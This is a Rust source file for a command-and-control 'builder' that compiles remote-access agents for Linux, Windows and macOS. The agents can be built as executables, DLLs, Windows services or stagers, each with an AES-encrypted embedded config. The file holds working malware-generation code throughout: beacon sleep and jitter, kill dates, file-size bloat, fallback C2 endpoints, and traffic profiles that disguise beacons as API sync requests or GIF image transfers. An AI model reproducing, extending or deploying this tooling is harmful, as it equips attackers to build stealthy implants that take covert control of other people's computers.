// src/bin/builder.rs
use clap::{Parser, ValueEnum};
use std::process::Command;
use std::fs;
use std::path::PathBuf;
use ed25519_dalek::SigningKey;
use rand::rngs::OsRng;
use rand::RngCore;
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use uuid::Uuid;
use serde_json::json;
use anyhow::{Context, Result};
use rusqlite::Connection;
use chrono::{Utc, Duration};
use aes_gcm::{
    aead::{Aead, AeadCore, KeyInit, OsRng as CryptoOsRng},
    Aes256Gcm
};
use std::collections::HashMap;

use rcm::common::{MalleableProfile, HttpBlock, TransformStep};

#[derive(Parser)]
#[command(name = "C2 Builder")]
#[command(author = "RCM")]
#[command(version = "2.0")]
struct Cli {
    #[arg(long, default_value = "127.0.0.1")] host: String,
    #[arg(long, default_value = "4443")] port: String,
    #[arg(long, value_enum, default_value_t = Platform::Linux)] platform: Platform,
    #[arg(long, value_enum, default_value_t = Transport::Tls)] transport: Transport,
    #[arg(long, value_enum, default_value_t = ProfileArg::Default)] profile: ProfileArg,
    #[arg(long)] profile_file: Option<String>,
    #[arg(long, value_enum, default_value_t = Format::Exe)] format: Format,
    #[arg(long)] fallback_file: Option<String>,
    #[arg(long, default_value_t = 40)] sleep: u64,
    #[arg(long, default_value_t = 20)] jitter_min: u32,
    #[arg(long, default_value_t = 10)] jitter_max: u32,
    #[arg(long, default_value_t = 0)] bloat: u64,
    #[arg(long, default_value_t = false)] debug: bool,
    #[arg(long, default_value_t = 0)] days: i64,
}

#[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug)]
enum Platform { Linux, Windows, Macos }

#[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug)]
enum Transport { Tls, TcpPlain, NamedPipe, Http, Https }

#[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug)]
enum ProfileArg { Default, HttpPost, HttpImage }

#[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug)]
enum Format { Exe, Dll, Service, Stager }

/// Find the cargo binary. Checks (in order):
///   1. $CARGO_HOME/bin/cargo          — set in Docker image
///   2. /usr/local/cargo/bin/cargo     — rust:latest default install path
///   3. ~/.cargo/bin/cargo             — local user install
///   4. `cargo` in $PATH               — last resort
fn find_cargo() -> PathBuf {
    // 1. $CARGO_HOME
    if let Ok(cargo_home) = std::env::var("CARGO_HOME") {
        let p = PathBuf::from(&cargo_home).join("bin").join("cargo");
        if p.is_file() { return p; }
    }

    // 2. Known absolute paths (rust:latest image)
    let known = [
        "/usr/local/cargo/bin/cargo",
        "/usr/local/bin/cargo",
        "/usr/bin/cargo",
    ];
    for path in &known {
        let p = PathBuf::from(path);
        if p.is_file() { return p; }
    }

    // 3. ~/.cargo/bin/cargo
    if let Ok(home) = std::env::var("HOME") {
        let p = PathBuf::from(home).join(".cargo").join("bin").join("cargo");
        if p.is_file() { return p; }
    }

    // 4. Fall back to bare name (relies on PATH)
    PathBuf::from("cargo")
}

/// Find the rustup binary. Mirrors find_cargo() — rustup lives alongside
/// cargo in the same bin directory.
///
/// This is used for target verification. `cargo target list` is NOT a valid
/// cargo subcommand; the correct tool is `rustup target list --installed`.
fn find_rustup() -> PathBuf {
    // 1. $CARGO_HOME/bin/rustup  (rustup installs itself here alongside cargo)
    if let Ok(cargo_home) = std::env::var("CARGO_HOME") {
        let p = PathBuf::from(&cargo_home).join("bin").join("rustup");
        if p.is_file() { return p; }
    }

    // 2. Known absolute paths
    let known = [
        "/usr/local/cargo/bin/rustup",
        "/usr/local/bin/rustup",
        "/usr/bin/rustup",
    ];
    for path in &known {
        let p = PathBuf::from(path);
        if p.is_file() { return p; }
    }

    // 3. ~/.cargo/bin/rustup
    if let Ok(home) = std::env::var("HOME") {
        let p = PathBuf::from(home).join(".cargo").join("bin").join("rustup");
        if p.is_file() { return p; }
    }

    // 4. Fall back to bare name (relies on PATH)
    PathBuf::from("rustup")
}

/// Locate the project root — the directory containing Cargo.toml.
/// Checks (in order):
///   1. Current working directory
///   2. Directory containing this binary
fn find_project_root() -> Option<PathBuf> {
    // 1. CWD
    if let Ok(cwd) = std::env::current_dir() {
        if cwd.join("Cargo.toml").is_file() {
            return Some(cwd);
        }
    }
    // 2. Adjacent to this binary
    if let Ok(exe) = std::env::current_exe() {
        if let Some(dir) = exe.parent() {
            if dir.join("Cargo.toml").is_file() {
                return Some(dir.to_path_buf());
            }
        }
    }
    None
}

fn main() -> Result<()> {
    let cli = Cli::parse();

    println!("\n=== RCM Builder v2.0 (Malleable) ===");
    println!("[*] Target:      {}", cli.host);
    println!("[*] Port/Pipe:   {}", cli.port);

    if cli.jitter_min > 100 { anyhow::bail!("Jitter Min cannot exceed 100%."); }

    // ── Locate build tooling ──────────────────────────────────────────
    let cargo_bin = find_cargo();
    println!("[*] Cargo:       {}", cargo_bin.display());

    // Verify cargo is actually executable
    let cargo_version = Command::new(&cargo_bin)
        .arg("--version")
        .output();
    match cargo_version {
        Ok(out) if out.status.success() => {
            let ver = String::from_utf8_lossy(&out.stdout);
            println!("[*] Cargo ver:   {}", ver.trim());
        }
        Ok(out) => {
            anyhow::bail!(
                "cargo --version failed (exit {:?}): {}",
                out.status.code(),
                String::from_utf8_lossy(&out.stderr).trim()
            );
        }
        Err(e) => {
            anyhow::bail!(
                "Cannot execute cargo binary at '{}': {}\n\
                 \n\
                 Ensure the Rust toolchain is installed in the Docker image.\n\
                 The Dockerfile must use a single-stage rust:latest build\n\
                 (not a multi-stage build that strips cargo from the final image).",
                cargo_bin.display(), e
            );
        }
    }

    // ── Locate project root (Cargo.toml) ──────────────────────────────
    let project_root = find_project_root().ok_or_else(|| {
        anyhow::anyhow!(
            "Cannot find Cargo.toml.\n\
             Expected it at CWD ({}) or adjacent to the builder binary.\n\
             In Docker the server must run with WORKDIR=/app and the \
             source tree must be present at /app.",
            std::env::current_dir().unwrap_or_default().display()
        )
    })?;
    println!("[*] Project root: {}", project_root.display());

    // ── Resolve profile ───────────────────────────────────────────────
    let final_profile = if let Some(path) = &cli.profile_file {
        println!("[*] Loading Profile: {}", path);
        let content = fs::read_to_string(path).context("Failed to read profile file")?;
        serde_json::from_str::<MalleableProfile>(&content).context("Invalid Profile JSON format")?
    } else {
        println!("[*] Using Built-in Profile: {:?}", cli.profile);
        construct_builtin_profile(&cli.profile)
    };

    println!("[*] Profile Name: {}", final_profile.name);

    let kill_ts = if cli.days > 0 {
        Utc::now().checked_add_signed(Duration::days(cli.days))
            .map(|dt| dt.timestamp())
    } else { None };

    let build_id = Uuid::new_v4().to_string();
    let hash_salt = Uuid::new_v4().to_string();
    println!("[*] Build ID:     {}", build_id);

    // ── Crypto setup ──────────────────────────────────────────────────
    let mut csprng = OsRng;
    let signing_key = SigningKey::generate(&mut csprng);
    let verify_key = signing_key.verifying_key();
    let pub_key_b64 = BASE64.encode(verify_key.to_bytes());

    let mut challenge_key_bytes = [0u8; 32];
    OsRng.fill_bytes(&mut challenge_key_bytes);
    let challenge_key_b64 = BASE64.encode(challenge_key_bytes);

    // ── Save server artifacts ─────────────────────────────────────────
    save_server_artifacts(&build_id, &signing_key, &final_profile)?;

    if let Err(e) = try_update_local_db(&build_id, &signing_key, &final_profile, &challenge_key_bytes) {
        println!("[!] Could not auto-update local DB: {}", e);
        println!("[*] Import 'dist/server_keys.json' manually.");
    }

    // ── Build config ──────────────────────────────────────────────────
    let port_u16 = if cli.transport == Transport::NamedPipe {
        0
    } else {
        cli.port.parse::<u16>().context("Port must be a number for TCP/TLS")?
    };

    let final_host = if cli.transport == Transport::NamedPipe {
        format!("{}:{}", cli.host, cli.port)
    } else {
        cli.host.clone()
    };

    let fallback_config: serde_json::Value = if let Some(path) = &cli.fallback_file {
        println!("[*] Loading Fallback: {}", path);
        let content = fs::read_to_string(path).context("Failed to read fallback file")?;
        let parsed: serde_json::Value = serde_json::from_str(&content).context("Invalid fallback JSON")?;
        let ep_count = parsed.get("endpoints").and_then(|e| e.as_array()).map(|a| a.len()).unwrap_or(0);
        let strategy = parsed.get("strategy").and_then(|s| s.as_str()).unwrap_or("priority");
        println!("[*] Fallback:     {} endpoints, strategy={}", ep_count, strategy);
        parsed
    } else {
        json!({"endpoints": [], "strategy": "priority", "dead_time_secs": 300})
    };

    let config_json = json!({
        "transport": match cli.transport {
            Transport::Tls       => "tls",
            Transport::TcpPlain  => "tcp_plain",
            Transport::NamedPipe => "named_pipe",
            Transport::Http      => "http",
            Transport::Https     => "https",
        },
        "profile": final_profile,
        "proxy": { "use_system": true, "url": "", "username": "", "password": "" },
        "fallback": fallback_config,
        "c2_host": final_host,
        "tunnel_port": port_u16,
        "sleep_interval": cli.sleep,
        "jitter_min": cli.jitter_min,
        "jitter_max": cli.jitter_max,
        "bloat_mb": cli.bloat,
        "debug": cli.debug,
        "server_public_key": pub_key_b64,
        "hash_salt": hash_salt,
        "build_id": build_id,
        "kill_date": kill_ts,
        "challenge_key": challenge_key_b64
    }).to_string();

    println!("[*] Encrypting configuration...");
    let key = Aes256Gcm::generate_key(&mut CryptoOsRng);
    let cipher = Aes256Gcm::new(&key);
    let nonce = Aes256Gcm::generate_nonce(&mut CryptoOsRng);
    let ciphertext = cipher.encrypt(&nonce, config_json.as_bytes())
        .map_err(|e| anyhow::anyhow!("Encryption failed: {}", e))?;

    let build_env_json = json!({
        "encrypted": true,
        "key_hex": hex::encode(key),
        "nonce_hex": hex::encode(nonce),
        "cipher_hex": hex::encode(ciphertext),
        "bloat_mb": cli.bloat
    }).to_string();

    // ── Compile ───────────────────────────────────────────────────────
    let (target, ext) = match cli.platform {
        Platform::Linux   => ("x86_64-unknown-linux-gnu", ""),
        Platform::Windows => ("x86_64-pc-windows-gnu", ".exe"),
        Platform::Macos   => {
            println!("\n[!] WARNING: macOS cross-compilation is not supported in the Docker image.");
            println!("[!] osxcross is required and is not installed.");
            println!("[!] Build macOS agents natively on a macOS host instead.\n");
            ("x86_64-apple-darwin", "")
        }
    };

    // Verify the target is installed before wasting time on compilation.
    //
    // FIX: the original code called `cargo target list --installed`, but
    // "cargo target" is not a valid cargo subcommand. cargo exits with an
    // error, the output is empty, `installed` is always false, and the
    // bail fires even when the target IS installed.
    //
    // The correct tool is `rustup target list --installed`. rustup lives
    // in $CARGO_HOME/bin/ alongside cargo, so find_rustup() mirrors the
    // same resolution logic as find_cargo().
    if cli.platform == Platform::Windows {
        let rustup_bin = find_rustup();
        let target_check = Command::new(&rustup_bin)
            .args(["target", "list", "--installed"])
            .output();

        let installed = target_check
            .map(|o| String::from_utf8_lossy(&o.stdout).contains(target))
            .unwrap_or(false);

        if !installed {
            anyhow::bail!(
                "Rust target '{}' is not installed.\n\
                 Run: rustup target add {}",
                target, target
            );
        }
    }

    let (bin_name, output_ext) = match cli.format {
        Format::Exe     => ("client", ext),
        Format::Dll     => ("client_dll", ".dll"),
        Format::Service => ("client_service", ext),
        Format::Stager  => ("stager", ext),
    };

    let format_name = cli.format.to_possible_value().unwrap().get_name().to_string();
    println!("[*] Format:       {}", format_name);
    println!("[*] Compiling {} for {}...", bin_name, target);

    // Use --target-dir pointing to the cached target/ directory so
    // incremental compilation works across builds.
    let target_dir = project_root.join("target");

    // Pass CARGO_HOME and RUSTUP_HOME explicitly in case the subprocess
    // doesn't inherit them from the environment (can happen when spawned
    // from within the server binary under certain init systems).
    let mut cmd = Command::new(&cargo_bin);
    cmd.args(["build", "--release", "--target", target, "--bin", bin_name])
       .arg("--target-dir")
       .arg(&target_dir)
       .current_dir(&project_root)
       .env("C2_BUILD_CONFIG", &build_env_json);

    // Propagate CARGO_HOME and RUSTUP_HOME
    if let Ok(ch) = std::env::var("CARGO_HOME") {
        cmd.env("CARGO_HOME", &ch);
    } else {
        cmd.env("CARGO_HOME", "/usr/local/cargo");
    }
    if let Ok(rh) = std::env::var("RUSTUP_HOME") {
        cmd.env("RUSTUP_HOME", &rh);
    } else {
        cmd.env("RUSTUP_HOME", "/usr/local/rustup");
    }

    // Path remapping for reproducible builds (strips source paths from binary)
    let cargo_home = std::env::var("CARGO_HOME").unwrap_or_else(|_| "/usr/local/cargo".to_string());
    cmd.env("RUSTFLAGS", format!(
        "--remap-path-prefix {}=/src --remap-path-prefix {}=/cargo",
        project_root.display(), cargo_home
    ));

    let status = cmd.status().context(
        "Failed to spawn cargo. Verify that cargo is installed and accessible."
    )?;

    if !status.success() {
        anyhow::bail!(
            "cargo build failed (exit {:?}).\n\
             Check the log above for compiler errors.",
            status.code()
        );
    }

    // ── Copy artifact to dist/ ────────────────────────────────────────
    let src_path = target_dir
        .join(target)
        .join("release")
        .join(format!("{}{}", bin_name, output_ext));

    fs::create_dir_all("dist")?;

    let short_id: String = build_id.chars().take(8).collect();
    let dest_path = PathBuf::from(format!(
        "dist/{}_{}_{}{}", format_name, cli.platform.to_possible_value().unwrap().get_name(),
        short_id, output_ext
    ));

    if src_path.exists() {
        fs::copy(&src_path, &dest_path)?;
        println!("\n[+] Build Success!");
        println!("[+] Binary: {}", dest_path.display());
        println!("[+] Format: {}", format_name);
        println!("[+] Profile: {}", final_profile.name);
    } else {
        anyhow::bail!(
            "Artifact not found at {}.\n\
             The build appeared to succeed but the output binary is missing.",
            src_path.display()
        );
    }

    Ok(())
}

fn save_server_artifacts(build_id: &str, key: &SigningKey, profile: &MalleableProfile) -> Result<()> {
    fs::create_dir_all("dist")?;
    let key_b64 = BASE64.encode(key.to_bytes());
    let profile_json = serde_json::to_string(profile)?;
    let import_data = json!({
        "build_id": build_id,
        "private_key": key_b64,
        "profile_data": profile_json,
        "note": "Import this into the server database table 'build_keys'"
    });
    fs::write("dist/server_keys.json", serde_json::to_string_pretty(&import_data)?)?;
    Ok(())
}

fn try_update_local_db(build_id: &str, key: &SigningKey, profile: &MalleableProfile, challenge_key: &[u8; 32]) -> Result<()> {
    let db_path = "c2_audit.db";
    let conn = Connection::open(db_path)?;

    conn.execute(
        "CREATE TABLE IF NOT EXISTS build_keys (
            build_id TEXT PRIMARY KEY,
            private_key BLOB,
            profile TEXT DEFAULT 'default',
            profile_data TEXT,
            challenge_key BLOB
        )",
        [],
    )?;

    let col_check = |name: &str| -> bool {
        conn.query_row(
            &format!("SELECT count(*) FROM pragma_table_info('build_keys') WHERE name='{}'", name),
            [], |r| r.get::<_, i32>(0)
        ).unwrap_or(0) > 0
    };
    if !col_check("profile_data") {
        let _ = conn.execute("ALTER TABLE build_keys ADD COLUMN profile_data TEXT", []);
    }
    if !col_check("challenge_key") {
        let _ = conn.execute("ALTER TABLE build_keys ADD COLUMN challenge_key BLOB", []);
    }

    let profile_json = serde_json::to_string(profile)?;
    conn.execute(
        "INSERT OR REPLACE INTO build_keys (build_id, private_key, profile, profile_data, challenge_key) VALUES (?1, ?2, ?3, ?4, ?5)",
        rusqlite::params![build_id, key.to_bytes(), profile.name, profile_json, &challenge_key[..]],
    )?;

    println!("[+] Automatically registered Build ID '{}' (Profile: {}) in local database.", build_id, profile.name);
    Ok(())
}

fn construct_builtin_profile(arg: &ProfileArg) -> MalleableProfile {
    match arg {
        ProfileArg::Default => MalleableProfile::default(),
        ProfileArg::HttpPost => {
            let mut headers = HashMap::new();
            headers.insert("Content-Type".into(), "application/octet-stream".into());
            headers.insert("Accept".into(), "*/*".into());
            MalleableProfile {
                name: "legacy_http_post".into(),
                user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Legacy/1.0".into(),
                format_http: true,
                http_get: HttpBlock {
                    uris: vec!["/api/v1/sync".into()],
                    headers: headers.clone(),
                    data_transform: vec![TransformStep::Base64],
                },
                http_post: HttpBlock {
                    uris: vec!["/api/v1/sync".into()],
                    headers,
                    data_transform: vec![TransformStep::Base64],
                }
            }
        },
        ProfileArg::HttpImage => {
            let mut headers = HashMap::new();
            headers.insert("Content-Type".into(), "image/gif".into());
            let gif_magic = "GIF89a".to_string();
            MalleableProfile {
                name: "legacy_http_image".into(),
                user_agent: "Mozilla/5.0 (Compatible; ImageFetcher/1.0)".into(),
                format_http: true,
                http_get: HttpBlock {
                    uris: vec!["/image.gif".into()],
                    headers: headers.clone(),
                    data_transform: vec![TransformStep::Append(gif_magic.clone())],
                },
                http_post: HttpBlock {
                    uris: vec!["/upload.gif".into()],
                    headers,
                    data_transform: vec![TransformStep::Prepend(gif_magic)],
                }
            }
        }
    }
}
